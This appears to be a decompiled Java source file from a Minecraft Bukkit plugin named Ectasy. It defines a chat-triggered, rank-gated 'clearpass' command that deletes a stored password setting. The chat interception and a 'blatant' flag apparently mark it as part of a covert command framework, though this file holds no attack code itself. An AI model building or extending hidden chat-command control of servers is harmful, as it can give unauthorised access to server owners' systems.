package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.ConfigurationUtil;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "clearpass",
   description = "Removes the password for Ectasy",
   blatant = false,
   rank = Rank.DEVELOPER
)
public class ClearPasswordCommand extends AbstractCommand {
   public ClearPasswordCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      ConfigurationUtil.delete("password");
      ConfigurationUtil.save();
      ChatUtil.sendChat(var1.getPlayer(), "Password successfully removed.");
   }
}
